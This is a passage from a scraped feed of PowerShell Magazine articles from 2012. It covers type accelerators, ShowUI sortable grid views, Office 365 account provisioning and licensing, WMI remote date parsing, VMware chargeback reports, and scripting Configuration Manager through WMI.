scripts today. Following the description of the System.Reflection.Assembly LoadWithPartialName static method, you can load the assembly containing the System.Windows.Forms namespace by invoking this command:\n$assembly = [Reflection.Assembly]::LoadWithPartialName(\u0026#39;System.Windows.Forms\u0026#39;) With the assembly loaded, we need to enumerate the public types that belong to the System.Windows.Forms namespace. Fortunately, this can be done with a single pipeline, as follows:\n$assembly.GetExportedTypes() | ` Where-Object { ` ($_.IsPublic -or $_.IsNestedPublic) -and ` ($_.FullName -like ‘System.Windows.Forms.*’) ` } | Select-Object -ExpandProperty FullName This technique works with any assembly, whether it is already loaded into PowerShell or not. Now that we have the tools to create type accelerators combined with the tools to enumerate namespaces, we’re able to put the two together and create something close to a using statement. I say “close” here because the using keyword is reserved, so we cannot actually create a using command in Windows Powershell 2.0, so we’ll have to come up with another appropriate command name instead.\nDefining the Type Accelerator Module With the type accelerator management commands and namespace type enumeration commands figured out, we’re all set to package the functionality up in a script module so that anyone can leverage this capability with simple PowerShell one-liners. The TypeAccelerator.zip file contains a TypeAccelerator script module that includes the following public commands:\nGet-TypeAccelerator (alias gtx)\nThis command allows you to enumerate type accelerators. You can optionally specify the Name(s) of the accelerator(s) you want to enumerate, the Type(s) for which you want to enumerate accelerators, and the Namespace(s) from which you want to enumerate accelerators.\nAdd-TypeAccelerator (alias atx)\nThis command allows you to create new type accelerators. It requires the Name of the accelerator and the Type it should be associated with. By default it will overwrite existing accelerators with the same name, however you can specify NoClobber to prevent any overwrites from happening.\nSet-TypeAccelerator (alias stx)\nThis command allows you to change an existing type accelerator, or add it if it does not exist. It requires the Name of the accelerator and the Type it should be associated with.\nRemove-TypeAccelerator (alias rtx)\nThis command allows you to remove type accelerators. You can either remove type accelerators by Name, by Type, or by Namespace.\nUse-Namespace (alias use)\nThis command allows you to emulate the C# using command in PowerShell. You can specify the namespace(s) you want to start using by Namespace name or by path (LiteralPath or Path) and Namespace name. You can make the namespace usage temporary by passing in a ScriptBlock, in which case the namespace will only be used inside of that script block. You can associate a shortcut to a namespace by giving it an Alias. This command will overwrite accelerators with the same name by default, however you can prevent that from happening by specifying NoClobber.\nUsage of these commands in the context of our example is as easy as a single PowerShell command. Here are some examples showing how you can use this module in your own scripts:\n# Enumerate all accelerators Get-TypeAccelerator # Enumerate type accelerators in the System.Management.Automation namespace Get-TypeAccelerator -Namespace System.Management.Automation # Add a type accelerator Add-TypeAccelerator -Name arraylist -Type System.Collections.ArrayList # Remove a type accelerator Remove-TypeAccelerator -Name arraylist # Use the Windows.Forms namespace Use-Namespace -Namespace Windows.Forms -ScriptBlock { [DialogResult]$result = [MessageBox]::Show(‘Test’) } With this module in your tool belt, you should be able to avoid a lot of unnecessary typing of type names in your PowerShell scripts. There are also some extremely useful things you can do with this module when defining custom types…I’ll talk more about that in a future article.\nThat’s it from me for this time. I hope you find this TypeAccelerator module as useful as I do. Feel free to distribute it however you wish.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/04/27/a-day-in-the-life-of-a-poshoholic-creating-and-using-type-accelerators-and-namespaces-the-easy-way/","tags":["How To"],"title":"A day in the life of a Poshoholic: Creating and using type accelerators and namespaces the easy way"},{"categories":["Module Spotlight","ShowUI"],"contents":"I’ve blogged a lot of quick demos with ShowUI (and its predecessors) in the last few years, but as things ramp up with ShowUI and it starts getting more attention at the enterprise level, a lot of the questions that we’ve been getting on the ShowUI forums focus on the professional touches that make a user interface feel like an application, and the challenges of pulling together different controls into a single user interface in a reusable way.\nIn this article we’ll walk through the process of building a reusable solution with ShowUI, demonstrating how to create re-useable control functions and how to pull them together into a single interface. The challenge for today will be a script to manage displaying a collection of data… with a rich interface for sorting and filtering.\nIn the interests of showing off some of the data-binding and templating features of WPF 3.5 and the built-in capabilities of PowerShell and ShowUI, we’re going to use a ListView with a GridView rather than a DataGrid (which is available in .Net 4, or in the WPFToolkit for .Net 3.5).\nTo get started with our display we need a ListView with a GridView which can sort and filter. We’ll create a reusable control for this, since it’s obviously something we’ll have a lot of use for. There’s been some guidance from the ShowUI team on how to create these reusable controls, but here are the basics:\n Create a function which outputs a WPF control (generally, a grid or panel with any other controls inside, but that’s not important). Include all of the common ShowUI parameters (Name, Row, Column, RowSpan, ColumnSpan, Width, Height, Top, Left, Dock, Show and AsJob). On the top-level control that you output, use the –ControlName parameter to create a scope for your control. On the top-level control that you output, pass through the common ShowUI parameters.  As a sidebar comment: If you’re new to ShowUI (or WPF), you need to know a couple of additional points:\n Most of the built-in functions with the “New” verb in ShowUI are essentially wrappers for working with a specific control (or class) in WPF, and the parameters map directly to properties and events on those controls. As a result, frequently the best documentation for a ShowUI command is the MSDN documentation for the control. A case in point is the ListView control that we’re working with, where the MSDN documentation includes an example of using it with a GridView and information about virtualizing and other optimizations that can be performed (and what would disable them). In ShowUI scripts, I usually use aliases like “ListView” instead of New-ListView. The reason for this is that the aliases are bound with the module name, so “ListView” is actually: ShowUI\\New-ListView. Because of that, they’re actually less likely to conflict with other modules than the name by itself (specifically, PowerTab has a New-TabItem command which has occasionally caused problems, but using the “TabItem” eliminates the problem).  Listing 1 shows the code for Show-GridView. As you can see, I’ve written a control which accepts one or more InputObjects (including from the pipeline) and displays them in a GridView, given a list of properties, and outputs the selected items when the window is closed. It also supports sorting the GridView when a column header is clicked. The code for that sorting is somewhat complex, but it’s just a translation into PowerShell of the MSDN article How to: Sort a GridView Column When a Header Is Clicked, so I’m not going to explain again it here, that article is a good resource, and the logic applies to all CollectionView controls. Note that Show-GridView requires ShowUI 1.3 or later because of the syntax of the Add-EventHandler call, which doesn’t handle bubble-up events in ShowUI 1.1.\nAlready we can use our control and pipe the output from it to additional commands. Anything selected in the GridView will be output when the window is closed (but if nothing is selected, everything will be output, so be careful, there’s no “cancel”). However, it doesn’t sort yet, and it also doesn’t have a way to filter the controls. Here’s an example:\nPS\u0026gt; Get-ChildItem | Show-GridView -Property Mode, Length, LastWriteTime, Name –Show -Name (split-path $Pwd -leaf) You do have to specify the properties that you want displayed, because we haven’t included anything to get them from PowerShell format files or through reflection, and you have to be careful: although PowerShell isn’t case sensitive, WPF is – so the data-binding which happens with the columns is case sensitive. This means that you have to put (for example) “LastWriteTime” rather than “lastwritetime” or you won’t get any values in the column.\nTo handle sorting we need to use Add-EventHandler, because the event we want to use to change the sorting isn’t an event of the ListView, it’s the Click event of the GridViewColumnHeader(s) which get added to the ListView automatically. To call Add-EventHandler we can just add code to the top of the On_Loaded event handler we already have … and we can handle the sort one of two ways:\nListing 2 shows a way to perform the sort using the native WPF sorting features. This method is by far the fastest and smoothest. The problem with it is that in PowerShell, we sometimes display data that’s not all the same. For instance, when we displayed Get-ChildItem above, we’ll probably have a mix of files and folders, which will mean that the “Length” column will be empty sometimes, which will break sorting by that column (try it yourself, you’ll see the errors in the console and the sort won’t work).\nListing 3 shows an alternate way to perform the sort. Rather than using WPF’s sorting mechanism, we can sort the original items in PowerShell, and then (re)assign the sorted collection to the view. This method is generally slower, but it’s guaranteed to work on anything that PowerShell outputs, because PowerShell’s sorting has better handling for missing values.\nTo handle filtering, we want to add a TextBox where you can type text, and then filter the list based on that text. Once again, we can filter in two ways. Hopefully you know how to use Where-Object to filter in PowerShell, so I’m going to skip over that and leave it as an exercise for you. One warning: when filtering, you’ll need to store a copy of the original list in the “Resources” of the control, because otherwise each filter will be permanent and cumulative!\nI’ve written Listing 4 as a generic control which takes any ItemsControl (or derived control) which has an Items or ItemsSource property and a CollectionView, and can filter it (so it will work with our Show-GridView, but also with any similar control). Since I don’t know the name of the ItemsControl, there’s a lot of extra code in both the Filter ScriptBlock (starting on line 42), and the Border Loaded event handler (starting on line 90), which serves primarily to find the control and its CollectionView. It’s somewhat convoluted, but it makes the Show-FilteredItemsControl more reuseable.\nWith the code from Listing 1 (with either Listing 2 or 3 in its “On_Loaded” handler) and Listing 4 together, we can now create sortable, filterable lists like this:\nPS\u0026gt; Show-FilteredItemsControl { Get-ChildItem | Show-GridView -Property Mode, Length, LastWriteTime, Name } –Show And use them to stop processes:\nPS\u0026gt; Show-FilteredItemsControl { \u0026gt;\u0026gt; Get-Process | Show-GridView -Property Handles, VM, CPU, \u0026gt;\u0026gt; Id, ProcessName \u0026gt;\u0026gt; } –Show | Stop-Process \u0026gt;\u0026gt; It’s a bit complicated, but it is possible to automatically determine which columns should be used (based on the PowerShell formatting rules), and to provide the ability to specify custom labels for the columns. Additionally, we could add UI for creating new items into the collection and removing items, so that this code could be used for editing lists of any sort of objects … but I’ll leave that as future topic.\nAs always, if you have questions, feel free to ask them on the ShowUI forums. Download the scripts for this article.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/04/25/building-advanced-user-interfaces-with-showui/","tags":["Modules","ShowUI"],"title":"Building Advanced User Interfaces with ShowUI"},{"categories":["Exchange","Office 365"],"contents":"The Office 365 platform provides a PowerShell module that can be used to provision and manage user accounts. You can even automate the process of assigning licenses to users in the cloud using the cmdlets in this module. However, the method you’ll need to use to get your users setup will depend on the type of deployment you’ll be using with the service.\nRight now you might be using the Quest Active Directory cmdlets, the Active Directory PowerShell module, or even ADSI to automate the process of provisioning user accounts on premises. When you decide to start utilizing the cloud services offered through Office 365, this may or may not need to change. For example, you might be planning on using Single Sign On, also known as Identity Federation, or implementing an Exchange hybrid deployment with Office 365. In this case, you’ll want to continue to provision user accounts on premises, the same as you do today, and your accounts will be synchronized to the cloud during the Directory Synchronization (DirSync) process.\nIf you won’t be using DirSync, you may want to automate the provisioning of your Office 365 accounts, and in either case, you can automate the task of licensing your users with the Microsoft Online Services Module for PowerShell.\nInstalling the Microsoft Online Services Module There are some prerequisites that you need to be aware of before you download and install the Microsoft Online Services Module for PowerShell.\n Operating System – you’ll need to be running Windows 7 or Windows Server 2008 R2 .NET Framework – the 3.5.1 version of the .NET Framework needs to be installed Microsoft Online Services Sign-In Assistant – log into the Office 365 portal, and under resources, click on Downloads. At the bottom of the screen, choose the option to Set up and configure your Office desktop apps.  Once you’ve verified the prerequisites are in place, you can download and install the module. You can get the appropriate version of module for your operating system using the following URLs.\n 32-bit Module – http://go.microsoft.com/fwlink/?linkid=236345 64-bit Module – http://go.microsoft.com/fwlink/?linkid=236293****  Getting Connected If you chose the default options when installing the module, you’ll have an icon on the desktop called Microsoft Online Services Module for Windows PowerShell. To get started, you can run PowerShell using this shortcut, or manually import the module into your standard PowerShell console using the Import-Module MSOnline command.\nOnce the module is imported into your shell session, you can connect to your Office 365 tenant and start managing your accounts. First, you’ll need to create a credential object using the Get-Credential cmdlet that will store your Office 365 tenant administrator credentials.\nPS\u0026gt; $cred = Get-Credential Then you can run the Connect-MsolService cmdlet and assign the credential object to the -Credential parameter.\nPS\u0026gt; Connect-MsolService -Credential $cred This command should complete without returning anything to the screen, and at that point, you’ll be connected to your Office 365 tenant.\nReviewing Licenses After you’re connected, you can view your current licensing configuration using the Get-MsolAccountSku cmdlet. This will provide you with several details, including how many licenses are being consumed, and how many are currently available:\nIf you want to license users as they are created them from the shell, or after they’ve been synchronized to the cloud with DirSync, you’ll need to know the AccountSkuId, which is in the format of tenant:SkuPartNumber. As you can see in Figure 1-2, I’ve signed up for an Enterprise account, my tenant name is uclabs, and I’m using 5 of my 25 licenses.\nProvisioning User Accounts To provision one or more user accounts, use the New-MsolUser cmdlet. For example, the following command will create a single user account and assign my Enterprise license during the provisioning process:\nNew-MsolUser -UserPrincipalName sjohnson@uclabs.onmicrosoft.com ` -DisplayName \u0026#39;Steve Johnson\u0026#39; ` -FirstName Steve ` -LastName Johnson ` -LicenseAssignment uclabs:ENTERPRISEPACK ` -UsageLocation US Notice that the -Password parameter was not used to assign an initial password, and in the output shown in Figure 1-3, you can see that a random password was assigned to the user account when it was created.\nAdditionally, you have the option of manually specifying a password using the -Password parameter.\nAs you can see in Figure 1-4, unlike most cmdlets that create user accounts, the value provided for the -Password parameter is not a secure string object, and must be a simple string value. Also keep in mind that by default, accounts will require strong passwords based on the following criteria:\n The password should contain at least one lowercase and one uppercase letter The password should contain one non-alphanumeric character No spaces, tabs, or line breaks are allowed You can’t set the password to the same value as the user name  If these password complexity requirements are too strict, you can set the -StrongPasswordRequired to $false. This parameter is available with the New-MsolUser cmdlet, and you can disable the strong password requirements for an account using the same parameter on the Set-MsolUser cmdlet.\nSelective Licensing Office 365 licenses can contain a subset of service plans. For example, when viewing the licensing settings in the Microsoft Online Services Portal for a user assigned an E3 plan license, you’ll see a screen similar to Figure 1-5 that displays each product.\nInstead of assigning all of the service plans available with the E3 license, you may only need to assign a subset of these, such as Office Professional Plus and Exchange Online. In order to do this from the shell, you’ll need to be able to view the service plan information to determine what your options are. In this case, we’re interested in the service plan details for the EnterprisePack sku, so we again turn to the Get-MsolAccountSku cmdlet. Here’s a one-liner that will provide this information:\nGet-MsolAccountSku | Where-Object {$_.SkuPartNumber -eq \u0026#39;ENTERPRISEPACK\u0026#39;} | ForEach-Object {$_.ServiceStatus} You can view the output from this one-liner in Figure 1-6.\nThis allows us to view each service plan individually, just as we would when logged into the portal. The service plan names might not be obvious at first glance. Here’s a breakdown of what each of these really are:\n OFFICESUBSCRIPTION – Office Professional Plus MCOSTANDARD – Lync Online SHAREPOINTWAC – Microsoft Office Web Apps SHAREPOINTENTERPRISE – SharePoint Online EXCHANGE_S_ENTERPRISE – Exchange Online  Now that we have this information, we can be selective about the licensing for our users. For example, we can modify the account we created earlier and change the license options so that the user is only assigned Office Professional Plus and Exchange Online licenses. In order to do that, we’ll need to create a LicenseOption object using the New-MsoLicenseOptions cmdlet. When running the cmdlet, we specify the account sku id, which in this case would be in the format of tenant:ENTERPRISEPACK, and then we disable the service plans that we do not want to be include in the object. We can do this by assigning an array of service plan items that we do not want the user to have to the DisabledPlans parameter:\nPS\u0026gt; $options = New-MsolLicenseOptions -AccountSkuId uclabs:ENTERPRISEPACK ` -DisabledPlans MCOSTANDARD,SHAREPOINTWAC,SHAREPOINTENTERPRISE In this example, the resulting LicenseOption object is saved to the $options variable, which can then be assigned to the_LicenseOptions_ parameter when modifying the account:\nPS\u0026gt; Set-MsolUserLicense -UserPrincipalName gsmith@uclabs.onmicrosoft.com ` -LicenseOptions $options You could also use this technique during the provisioning process. You would just need to assign the $options object to the LicenseOptions parameter when creating the account:\nNew-MsolUser -UserPrincipalName jneilsen@uclabs.onmicrosoft.com ` -DisplayName \u0026#39;Joe Neilsen\u0026#39; -FirstName Joe ` -LastName Neilsen -LicenseAssignment uclabs:ENTERPRISEPACK ` -LicenseOptions $options -UsageLocation US It’s worth mentioning that Exchange Online also can be managed using the Exchange Management Shell via PowerShell remoting. However, when you assign an Exchange license using the Microsoft Online Services Module for Powershell, it will automatically mailbox-enable the account.\nBulk Licensing You may need to regularly assign licenses to accounts. This is especially true if you’ll be using DirSync, as user accounts provisioned on premises will be synched to the cloud, but will eventually need to be assigned a license. You can use the Get-MsolUser cmdlet to determine which users are currently unlicensed using the UnlicensedUsersOnly switch parameter:\nTo ensure that each user is licensed, you can retrieve all unlicensed users, pipe those objects down to the Set-MsolUserLicense cmdlet, and apply a license to each account. First, you’ll need to ensure that a usage location is set for your accounts. This example would set the usage location to the United States for all of my unlicensed accounts:\nGet-MsolUser -UnlicensedUsersOnly | Set-MsolUser -UsageLocation us Next, I can then license those users:\nGet-MsolUser -UnlicensedUsersOnly | Set-MsolUserLicense -AddLicenses uclabs:ENTERPRISEPACK Additionally, you could use the LicenseOptions parameter if you need to selectively apply service plans to your accounts.\nProvisioning Accounts in Bulk from a CSV File There is an option in the web based portal where a CSV file can be uploaded to create user accounts in bulk. This works really well, but it is an interactive process. If accounts need to be provisioned and licensed automatically, an automated script that leverages a CSV file and the New-MsolUser cmdlet can be used. Let’s take a look at how we could do this using the CSV file shown in Figure 1-8.\nEach of the column names in the CSV file correspond to the parameter names we used earlier with the New-MsolUser cmdlet. Using the Import-CSV cmdlet, we can read this file into the shell, loop through each record, and create and license an Office 365 account for each of our users. Here is some code that would accomplish this:\nImport-Csv -Path c:\\users.csv | ForEach-Object { New-MsolUser -FirstName $_.FirstName -LastName $_.LastName ` -UserPrincipalName $_.UserPrincipalName ` -DisplayName \u0026#34;$($_.FirstName)$($_.LastName)\u0026#34; ` -LicenseAssignment \u0026#39;uclabs:ENTERPRISEPACK\u0026#39; ` -UsageLocation US } The only problem here is that if we run this code as-is, a random password will be generated for each user, and we’re not capturing that information. We can make a small change and simply pipe the results to a file that can be used to document the passwords for the newly created accounts:\nImport-Csv -Path c:\\users.csv | ForEach-Object { New-MsolUser -FirstName $_.FirstName -LastName $_.LastName ` -UserPrincipalName $_.UserPrincipalName ` -DisplayName \u0026#34;$($_.FirstName)$($_.LastName)\u0026#34; ` -LicenseAssignment \u0026#39;uclabs:ENTERPRISEPACK\u0026#39; -UsageLocation US } | Export-Csv -Path c:\\provisioned_users.csv -NoTypeInformation This time we’ve added the Export-CSV command to the end of our script, which will store the account information, along with the random password generated for each user. We can then use this report to distribute passwords the end-users.\nAnother option would be to predefine the passwords. Just add a new column to the CSV file that contains a password for each account, and update the code to assign that value to the -Password parameter during the provisioning process.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/04/23/provisioning-and-licensing-office-365-accounts-with-powershell/","tags":["Exchange","Office 365"],"title":"Provisioning and Licensing Office 365 Accounts with PowerShell"},{"categories":["WMI"],"contents":"The other day I was asked to check the local date and time on some workstations in our network. The reason for that was time skew, and as I was told, some workstations’ clock was 1 hour behind. I launched PowerShell and wrote a quick script to get the raw WMI value of the local date and time on a list of ****remote machines and convert it to a readable DateTime object:\n$computers = \u0026#39;pc1\u0026#39;,\u0026#39;pc2\u0026#39;,\u0026#39;pc3\u0026#39; $computers | ForEach-Object{ $os = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $_ $cdt = @{Name=\u0026#39;ConvertedDateTime\u0026#39;;Expression={$_.ConvertToDateTime($os.LocalDateTime)}} $os | Select-Object -Property Name,LocalDateTime,$cdt } The result looked like:\nName LocalDateTime ConvertedDateTime ---- ------------- ---- pc1 20110912093710.927000+120 9/12/2011 10:37:10 AM pc2 20110912103722.322000+120 9/12/2011 10:37:22 AM pc3 20110912103703.530000+120 9/12/2011 10:37:03 AM I took a quick look at the last column and was able to determine that the time on the machines in question was correct. Right?\nWrong! Take a look at the result. Do you find anything unusual? Sharp-eyed among you probably noticed that there’s a one hour difference on pc1, between the hour in the LocalDateTime and the converted one (9 vs. 10). I was always under the impression that the DMTF conversion happens on the remote machine but apparently I was wrong.\nThe ConvertToDateTime method used in the calculated property is a script method added via ETS (Extended Type System) and under the cover it is using the [System.Management.ManagementDateTimeconverter]::ToDateTime method.\nThe description of the method in MSDN says:\nConverts a given DMTF date time to DateTime. The returned DateTime will be in the current time zone of the system. Which raises the question: the current time zone of the remote machine or the time zone of the machine that executed the script? The ToDateTime method doesn’t support remote connections so conversion is done locally. This can, and does, introduce a “bug” or false results. No one really checks the value of LocalDateTime (guilty as charged); it’s too cryptic, and I have always counted on the result of the ConvertToDateTime method.\nNow that I know that the conversion is made on the machine that executes the script I use one of the following to parse the LocalDateTime value (the Win32_LocalTime class is supported on XP/Windows Server 2003 and above):\nPS\u0026gt; $lt = Get-WmiObject -Class Win32_LocalTime -ComputerName pc1 PS\u0026gt; Get-Date -Year $lt.Year -Month $lt.Month -Day $lt.Day -Hour $lt.Hour -Minute ` $lt.Minute -Second $lt.Second Monday, September 12, 2011 9:37:10 AM or PS\u0026gt; [datetime]::ParseExact($lt.split(\u0026#39;.\u0026#39;)[0],\u0026#39;yyyyMMddHHmmss\u0026#39;,$null) Monday, September 12, 2011 9:37:10 AM ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/04/20/parsing-remote-machine-local-date-and-time-with-wmi/","tags":["WMI"],"title":"Parsing remote machine local date and time with WMI"},{"categories":["PowerCLI","VMware"],"contents":"The following is a typical scenario that you are bound to see in your environment. Your organization has several projects running, and each of these projects uses a number of virtual machines in your VMware vSphere environment. Management wants you to send a daily informational email to each project leader, with an overview consumed resources for his project(s).\nPowerShell to the rescue!\nGetting the stats The PowerCLI snap-in provides a cmdlet called Get-Stat that will provide us with the statistical data from the vCenter database. Based on a Custom Attribute, called Project, that is present on each machine that belong to a specific project, the script will first select all the Virtual Machines.\nOnce the selection of the Virtual Machines is made, the script will retrieve the statistical data. To limit the load on the vCenter, we only use one Get-Stat call in the script. With some nested Group-Object calls, the script produces a report per project owner, detailing all virtual machines in each of his projects.\nTo keep the example script simple, we only retrieve two metrics. But it should be obvious that you can easily expand the script to retrieve and calculate numerous other metrics.\nWho to send it to? The ProjectOwner custom attribute contains an Active Directory Display Name value. With an AdsiSearcher call, the script can easily find the email address of the user and send him the report by email.\n$dcName = \u0026#34;TEST\u0026#34; $displayName = $projectOwner $adDomain = [adsi](\u0026#34;LDAP://\u0026#34; + $dcName + \u0026#34;:389/dc=mycorp,dc=com\u0026#34;) $adSearch = [adsisearcher]$adDomain $adSearch.Filter = \u0026#39;(\u0026amp;(objectClass=User)(name=\u0026#39; + $displayName + \u0026#39;))\u0026#39; $result = $adSearch.FindOne() $mailAddress = $result.Properties[\u0026#34;mail\u0026#34;][0] With the Quest’s AD snapin the code required to find the email address becomes a lot easier.\n$user = Get-QADUser -DisplayName $projectOwner $emailAddress = $user.Email Management wants the report , that is send to the Project Owner, to look something like this\nTo avoid cluttering the script, the report shows the data in its simplest form. You can of course go out of your way and send the report as an HTML mail, using style sheets and all.\nFind the complete reporting script as file vcProjectStats.ps1.\nSchedule the task We want to schedule the report task to run every day at 02:00 AM. This can be accomplished quite easily with the TaskScheduler module that comes with the PowerShellPack .\nBefore installing the PowerShellPack make sure to “Unblock” the MSI file. And make sure to correct the typo in the Register-ScheduleTask code before you use the module.\nThe available functions in the TaskScheduler module give access to most of the Task Scheduler 2.0 features. But for our purposes, one important feature was missing, the ability to run the scheduled task under a well-defined account.\nTo solve that problem I created a function, called Set-TaskPrincipal. This function will fill in the required Principal properties. The password for the account is passed to the Task Scheduler during the registration of the task, in the Register-ScheduledTask function.\nThe script to create the Scheduled Task can be found as attachment Create-ScheduledTask.ps1\nConclusion For those that are not yet convinced, I think that these small scripts show, once again, how easy it is to use PowerShell to solve your day-to-day task as an administrator.\nThe scripts demonstrate\n the flexibility to use 3-party snapins in your scripts the availability of numerous modules to solve your problems the ease to expand on existing modules the richness of the core PowerShell language  And as always, there is no single, correct script when using PowerShell. Feel free to send in your improvement suggestions or different methods to tackle the problem.\nHappy scripting !\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/04/18/project-chargeback-reports/","tags":["VMware","PowerCLI"],"title":"Project Chargeback Reports"},{"categories":["Configuration Manager"],"contents":"Introduction First off, I\u0026rsquo;d like to express my sincere thanks to the board of the PowerShell Magazine for allowing me to publish an article in the premiere issue of the magazine. It’s quite an honor to be asked to participate in such an endeavor, and I can only wish to live up to the high expectations that other PowerShellers have set through their demonstrable experience.\nIn this article, we’ll explore the use of Microsoft’s Windows PowerShell (aka. PoSH) in concert with Microsoft System Center Configuration Manager (SCCM or ConfigMgr). ConfigMgr is Microsoft’s flagship tool for managing systems large-scale PowerShell is the ideal automation tool for repeatable tasks around ConfigMgr. Although SCCM is a powerful management tool in and of itself, there are often situations that require custom scripting to accomplish a task that would otherwise take a lengthy amount of time if performed manually.\nWhy use PowerShell with ConfigMgr? At this point, you might be asking yourself: “why is PowerShell so important if I’m automating ConfigMgr? I use VBscript or don’t need to script at all.”\nFirst and foremost, it’s because PowerShell is Microsoft’s current, standard automation tool for their entire platform. Nearly every single Microsoft product is easily automated with PowerShell, due to the vast array (no pun intended) of extensibility options that PowerShell has. It plugs directly into .NET types (and even allows dynamic compilation of C# code), Windows Management Instrumentation (WMI), Component Object Model (COM), Web Services (SOAP, REST), and so on. Along with this reasoning, is the fact that VBscript is outdated and hasn’t seen any significant update by Microsoft in years — if you’re still using VBscript, I’d recommend taking the time it takes you to code, and invest it in learning PowerShell. In the long run, it’ll save you a lot of time, and turn you into a much more powerful and capable automator!\nThanks to the out-of-box commands in PowerShell, some automation tasks requiring many lines of VBscript code can be consolidated into much fewer lines of PowerShell code. To be honest, sometimes I feel a little dirty using cmdlets, as I personally prefer using PowerShell as a “.NET scripting language” (meaning I like to write C#-like code). As long as they’re built-in commands though, and don’t create a dependency on an external module, I’m usually ok with using them.\nMost importantly, using PowerShell with ConfigMgr is important because the ConfigMgr “API” is essentially a huge WMI provider. As you probably know by now, PowerShell is tightly integrated with WMI and provides a number of type accelerators and cmdlets to make retrieving, changing, and monitoring information in WMI easy.\nYou might even say that you don’t need to script ConfigMgr (or anything) at all, which may be true, however I’d argue differently. In my personal experience, I have found that knowledge of automation has provided me many more opportunities to tell people “yes” rather than “no” – this results in you becoming a more valuable asset to your employer and your peers in the IT community at large. Have you noticed how a lot of people take other people’s scripts and tweak them to their needs? Wouldn’t it be cool if *you* were one of those people whose scripts are taken and tweaked?\nNow that we’ve discussed the “whys” of using PowerShell with ConfigMgr, let’s move on and talk about how to get started.\nHow do I get started with automating ConfigMgr and PowerShell? WMI To get started, the most important concept you’ll need to familiarize yourself with is WMI. With a firm understanding of WMI, your experience scripting ConfigMgr will be much simpler. There are a number of books, and plenty of blogs and articles out there that either talk explicitly about WMI or at least show examples of how to use WMI with PowerShell.\nAs far as PowerShell goes, you’ll be using the Get-WmiObject cmdlet a lot, as well as the [wmi] type accelerator. In some cases, you’ll also be able to leverage the [wmiclass] type accelerator when you want to retrieve metadata about WMI class definitions or properties.\nWMI Explorer You should also equip yourself with the proper developer tools when writing ConfigMgr PowerShell scripts.\nAside from PowerShell itself, one of the most vital tools I always keep handy is a WMI explorer utility. Windows has a built-in WMI explorer called wbemtest, which is both powerful, flexible, and comprehensive in WMI feature support. Wbemtest is great when you are working on a computer that doesn’t have anything else immediately available, and for testing event queries, but for general browsing through WMI, I prefer to use the free WMI Explorer utility from SAPIEN Technologies. Although it does not provide any support for testing WMI event queries, it’s great to be able to easily list WMI classes, and view their properties and methods (complete with input and output parameters).\nScript Editor For testing PowerShell code, you can obviously use the console, but when writing longer scripts or modules, you’ll want an editor of sorts, similar to how developers use Visual Studio for .NET projects. For this, you have the option of using the built-in PowerShell v2 Integrated Scripting Editor (ISE) or you can use the tool that I prefer, the free Quest PowerGUI Script Editor available at http://www.powergui.org. Both the ISE and PowerGUI are extensible editors, however I tend to prefer PowerGUI for the “intellisense” support similar to what Visual Studio offers. It’s pretty much up to you to make a decision on which editor feels best to you.\nWhat do I need to be aware of? Although ConfigMgr’s API is built on WMI, there are a couple of unique features that you ought to be aware of. Even if you’ve worked with PowerShell and WMI before, some things in the ConfigMgr provider are unique to it, and will require special consideration.\nCorrelation to SQL Views As you work with the ConfigMgr WMI provider, you’ll begin to notice a strong correlation between the ConfigMgr database’s more friendly SQL views and the WMI classes offered by the provider. In most cases, the only major difference is going to be the item’s prefix – for example, the hardware inventory SQL views are prefixed with “v_GS_” whereas the correlating WMI classes are prefixed with “SMS_G_System_”.\nAs a result of this strong — but not entirely consistent — correlation, it is generally a simple task to translate SQL queries into WQL queries.\nLazy Properties Certain ConfigMgr WMI classes will have properties marked with a WMI qualifier called “lazy.” If a property is marked lazy, then it means that the property’s value will not be returned in an enumeration of WMI class instances. In this case, to retrieve the property’s value, you must first determine the specific WMI instance you want, and obtain a reference to that instance directly using its WMI path. I’ve found that the easiest method of achieving this is to enumerate the instances of a given WMI class until a condition I am interested in is met, and then use the [wmi] type accelerator to access the WMI instance using its __PATH system property.\n$SccmUpdateLists = Get-WmiObject -Namespace root\\sms\\site_lab ` -Class SMS_AuthorizationList –ComputerName sccm01 foreach ($SccmUpdateList in $SccmUpdateLists) { if ($SccmUpdateList.LocalizedDisplayName -eq ‘My Update List’) { $SccmUpdateList = [wmi]”$($SccmUpdateList.__PATH)” } } On my personal blog at http://trevorsullivan.net, I have an article that talks about lazy properties in depth and also describes how to identify which classes have lazy properties, and exactly which properties they are.\nConfigMgr-specific WQL Keywords Another unique attribute of the ConfigMgr WMI provider is the support for additional WQL keywords. The most notable and probably most commonly used keyword that you’ll get accustomed to using is the JOIN keyword. Since the ConfigMgr provider does not use CIM_REFERENCE types with association classes to join other data classes together, it’s up to you to use a common identifier to join data classes together. For ConfigMgr hardware inventory classes, you’ll generally join in the ResourceID property, and other objects use different common identifiers, such as UpdateID for software updates objects.\nHere is an example of using the JOIN keyword:\nPS\u0026gt; $MyQuery = @\u0026#34;\u0026#34; \u0026gt;\u0026gt; select * from SMS_G_System_Computer_System \u0026gt;\u0026gt; JOIN SMS_G_System_Disk on \u0026gt;\u0026gt; SMS_G_System_Computer_System.ResourceID = SMS_G_System_Disk.ResourceID \u0026gt;\u0026gt; @ PS\u0026gt; Get-WmiObject -Namespace root\\sms\\site_lab -Query $MyQuery Rather than typing the query by hand, you can optionally use the query builder in the ConfigMgr collection editor window, to assist you with visually building certain inventory-related queries. Once the desired query is built, you can simply hit the “Show query language” button to display the WQL code, which you can then copy/paste into your PowerShell script.\nEvent Management One of the more powerful (and lesser known) functions of WMI is the ability for you to subscribe to and respond to events. Since the ConfigMgr API is built on WMI, we automatically get this functionality for free. Although ConfigMgr generates certain status messages to notify administrators of changes to objects in the hierarchy, it is not comprehensive. In situations where these status messages do not get generated, it may be necessary to subscribe for WMI events in order to get the desired change notifications.\nUsing PowerShell v2, it is possible to create a temporary event registration that survives as long as the PowerShell session is open, or until explicitly unregistered, using the Register-WmiEvent cmdlet. If a more permanent notification solution is needed, you can create permanent WMI event registrations using the PowerEvents PowerShell module. Back in November 2010, I created this module partially with the intention of using it to ease registration of permanent change notifications in ConfigMgr.\nIf you want to learn more about WMI event management, please review the documentation included in the 